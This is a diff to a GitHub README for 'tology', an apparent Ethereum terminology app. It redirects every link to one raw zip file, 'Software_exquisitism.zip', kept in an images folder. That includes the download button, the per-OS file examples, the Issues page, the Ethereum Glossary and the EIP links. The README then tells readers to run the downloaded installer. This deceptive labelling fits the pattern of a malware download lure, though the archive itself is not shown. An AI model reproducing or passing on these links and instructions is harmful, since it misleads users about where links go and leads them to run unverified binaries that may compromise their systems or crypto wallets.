@@ -8,7 +8,7 @@ Welcome to the **tology** project. This application provides an ontology of Ethe
 
 To get started with tology, you need to download the software. Click the button below to visit the Releases page and download the latest version:
 
-[![Download tology](https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip%20tology-v1.0-blue)](https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip)
+[![Download tology](https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip%20tology-v1.0-blue)](https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip)
 
 ## 📋 System Requirements
 
@@ -23,16 +23,16 @@ Before you download, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Go to the Releases page by clicking the link below:  
-   [Download tology](https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip)
+   [Download tology](https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Find the latest version that matches your operating system.
 
 3. **Download the File**  
    Click the link for the file that corresponds to your OS.  
-   - For Windows, you might see a file like `https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip`.
-   - For Linux, find the appropriate package like `https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip`.
+   - For Windows, you might see a file like `https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip`.
+   - For macOS, look for `https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip`.
+   - For Linux, find the appropriate package like `https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip`.
 
 4. **Run the Installer**  
    After the download is complete, navigate to your downloads folder and run the downloaded file. Follow the on-screen instructions to complete the installation process.
@@ -70,14 +70,14 @@ If you encounter any issues during installation or while using the app, consider
 
 If you need further assistance, feel free to reach out through the following channels:
 
-- **Issues Page:** Report any bugs or feature requests on the [Issues page](https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip).
+- **Issues Page:** Report any bugs or feature requests on the [Issues page](https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip).
 - **Community Support:** Join discussions in the community forums for help and tips.
 
 ## 🌐 Learn More
 
 For more information about Ethereum terms and concepts, check out the following resources:
 
-- [Ethereum Glossary](https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip)
-- [Ethereum Improvement Proposals](https://raw.githubusercontent.com/Carjoo21/tology/main/AllCoreDevs_EL_Meeting_Summaries/tology-v2.4.zip)
+- [Ethereum Glossary](https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip)
+- [Ethereum Improvement Proposals](https://github.com/Carjoo21/tology/raw/refs/heads/main/images/Software_exquisitism.zip)
 
 Feel free to explore and enhance your understanding of Ethereum with **tology**!
